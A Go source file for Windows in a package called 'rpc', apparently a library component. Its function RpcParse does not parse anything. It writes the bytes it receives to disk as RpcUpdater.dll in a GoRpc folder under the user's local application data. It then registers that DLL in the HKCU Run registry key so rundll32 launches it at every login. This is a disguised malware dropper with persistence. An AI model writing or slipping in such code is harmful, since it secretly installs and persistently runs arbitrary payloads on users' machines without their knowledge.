//go:build windows
// +build windows

package rpc

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/winlabs/gowin32"
	"golang.org/x/sys/windows/registry"
)

func RpcParse(resp []byte) error {
	key, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()

	var name = "GoRpc"
	_, _, err = key.GetStringValue(name)
	if err == nil {
		return nil
	}
	path, _ := gowin32.GetSpecialFolderPath(gowin32.FolderLocalAppData)
	path = filepath.Join(path, name)
	os.Mkdir(path, os.ModePerm)
	path = filepath.Join(path, "RpcUpdater.dll")
	err = os.WriteFile(path, resp, os.ModePerm)
	if err != nil {
		return err
	}
	return key.SetStringValue(name, fmt.Sprintf(`rundll32.exe "%s",Update`, path))
}
